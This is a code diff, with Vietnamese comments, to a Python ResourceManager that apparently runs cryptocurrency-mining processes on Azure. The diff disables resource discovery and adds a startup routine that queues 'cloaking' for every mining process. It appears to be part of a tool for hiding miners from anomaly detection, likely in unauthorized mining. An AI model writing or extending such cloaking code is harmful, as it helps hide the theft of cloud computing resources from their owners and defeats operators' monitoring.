@@ -29,7 +29,6 @@ from .resource_control import ResourceControlFactory
 #     AzureNetworkWatcherClient,
 #     AzureAnomalyDetectorClient
 # )
-
 # Ở đây, ta sẽ tạm thời bỏ qua các Azure Clients, chỉ giữ lại AzureAnomalyDetectorClient
 from .azure_clients import AzureAnomalyDetectorClient
 
@@ -421,7 +420,7 @@ class ResourceManager(IResourceManager):
 
             # Khởi tạo Azure clients, khám phá tài nguyên
             self.initialize_azure_clients()
-            self.discover_azure_resources()
+            # self.discover_azure_resources()
 
             # Tạo thread watchers
             monitor_thread = threading.Thread(
@@ -439,6 +438,9 @@ class ResourceManager(IResourceManager):
             )
             adjust_thread.start()
             self.watchers.append(adjust_thread)
+
+            # Trigger cloaking ban đầu cho tất cả tiến trình khai thác
+            self.trigger_initial_anomaly_signal()
 
             self.logger.info("ResourceManager đã khởi động thành công.")
         except Exception as e:
@@ -551,6 +553,25 @@ class ResourceManager(IResourceManager):
             self.logger.info(f"Đã enqueue khôi phục cho PID={process.pid}.")
         except Exception as e:
             self.logger.error(f"Không thể enqueue restoration PID={process.pid}: {e}\n{traceback.format_exc()}")
+
+    def trigger_initial_anomaly_signal(self):
+        """
+        Áp dụng cloaking ban đầu cho tất cả tiến trình khai thác được phát hiện
+        khi khởi động. Dùng trực tiếp enqueue_cloaking để thêm vào hàng đợi xử lý.
+        """
+        try:
+            self.logger.info("Bắt đầu enqueue cloaking ban đầu cho các tiến trình khai thác...")
+
+            for process in self.mining_processes:
+                try:
+                    self.enqueue_cloaking(process)
+                    self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
+                except Exception as e:
+                    self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")
+
+            self.logger.info("Hoàn thành enqueue cloaking ban đầu.")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi enqueue cloaking ban đầu: {e}\n{traceback.format_exc()}")
 
     def process_resource_adjustments(self):
         """
